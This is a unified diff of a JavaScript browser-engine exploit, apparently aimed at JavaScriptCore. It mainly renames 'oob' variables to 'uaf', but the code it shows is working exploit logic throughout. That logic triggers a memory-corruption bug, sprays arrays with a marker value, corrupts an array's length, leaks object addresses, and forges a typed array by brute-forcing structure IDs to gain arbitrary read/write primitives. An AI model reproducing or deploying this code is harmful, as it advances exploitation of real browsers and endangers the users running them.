@@ -349,7 +349,7 @@ BigInt.TYPE_MAP = {
   Float64Array: 'f64',
 }
 
-function make_oob(arr) {
+function make_uaf(arr) {
     var o = {}
     for (var i in {xx: ""}) {
         for (i of [arr]) {}
@@ -360,7 +360,7 @@ function make_oob(arr) {
 }
 
 // needed for rw primitives
-var prim_oob_idx = -1
+var prim_uaf_idx = -1
 var prim_spray_idx = -1
 var prim_marker = new BigInt(0x13371337, 0x13371337) // used to find sprayed array
 
@@ -379,16 +379,16 @@ for (var i = 0; i < structs.length; i++) {
   structs[i][`spray_${i}`] = 0x1337
 }
 
-log("Intiate OOB...")
+log("Intiate UAF...")
 
-var oob_arr = new Uint32Array(0x80000)
+var uaf_arr = new Uint32Array(0x80000)
 
 // fake m_hashAndFlags
-oob_arr[4] = 0xB0 
+uaf_arr[4] = 0xB0 
 
-make_oob(oob_arr)
+make_uaf(uaf_arr)
 
-log("Achieved OOB !!")
+log("Achieved UAF !!")
 
 log("Spraying arrays with marker...")
 // spray candidates arrays to be used as leak primitive
@@ -399,24 +399,24 @@ for (var i = 0; i < spray.length; i++) {
 
 log("Looking for marked array...")
 // find sprayed candidate by marker then corrupt its length 
-for (var i = 0; i < oob_arr.length; i += 2) {
-  var val = new BigInt(oob_arr[i + 1], oob_arr[i])
+for (var i = 0; i < uaf_arr.length; i += 2) {
+  var val = new BigInt(uaf_arr[i + 1], uaf_arr[i])
   if (val.eq(prim_marker)) {
-    log(`Found marker at oob_arr[${i}] !!`)
+    log(`Found marker at uaf_arr[${i}] !!`)
 
-    prim_oob_idx = i - 2
+    prim_uaf_idx = i - 2
 
-    log (`Marked array length ${new BigInt(0, oob_arr[prim_oob_idx])}`)
+    log (`Marked array length ${new BigInt(0, uaf_arr[prim_uaf_idx])}`)
 
     log("Corrupting marked array length...")
     // corrupt indexing header
-    oob_arr[prim_oob_idx] = 0x1337
-    oob_arr[prim_oob_idx + 1] = 0x1337
+    uaf_arr[prim_uaf_idx] = 0x1337
+    uaf_arr[prim_uaf_idx + 1] = 0x1337
     break
   }
 }
 
-if (prim_oob_idx === -1) {
+if (prim_uaf_idx === -1) {
   throw new Error("Failed to find marked array !!")
 }
 
@@ -437,7 +437,7 @@ if (prim_spray_idx === -1) {
 
 log("Intiate RW primitives...")
 
-var prim_oob_obj_idx = prim_oob_idx + 4
+var prim_uaf_obj_idx = prim_uaf_idx + 4
 
 slave = new Uint32Array(0x1000)
 slave[0] = 0x13371337
@@ -447,7 +447,7 @@ leak_obj = {a: slave, b: 0, c: 0, d: 0}
 
 spray[prim_spray_idx][1] = leak_obj
 
-leak_obj_addr = new BigInt(oob_arr[prim_oob_obj_idx + 1], oob_arr[prim_oob_obj_idx])
+leak_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])
 
 // try faking Uint32Array master by incremental structure_id until it matches from one of sprayed earlier in structs array
 var structure_id = 0x80
@@ -461,12 +461,12 @@ while (!(master instanceof Uint32Array)) {
 
   spray[prim_spray_idx][1] = rw_obj
 
-  var rw_obj_addr = new BigInt(oob_arr[prim_oob_obj_idx + 1], oob_arr[prim_oob_obj_idx])
+  var rw_obj_addr = new BigInt(uaf_arr[prim_uaf_obj_idx + 1], uaf_arr[prim_uaf_obj_idx])
 
   rw_obj_addr = rw_obj_addr.add(new BigInt(0, 0x10))
 
-  oob_arr[prim_oob_obj_idx] = rw_obj_addr.lo()
-  oob_arr[prim_oob_obj_idx + 1] = rw_obj_addr.hi()
+  uaf_arr[prim_uaf_obj_idx] = rw_obj_addr.lo()
+  uaf_arr[prim_uaf_obj_idx + 1] = rw_obj_addr.hi()
 
   master = spray[prim_spray_idx][1]
 }
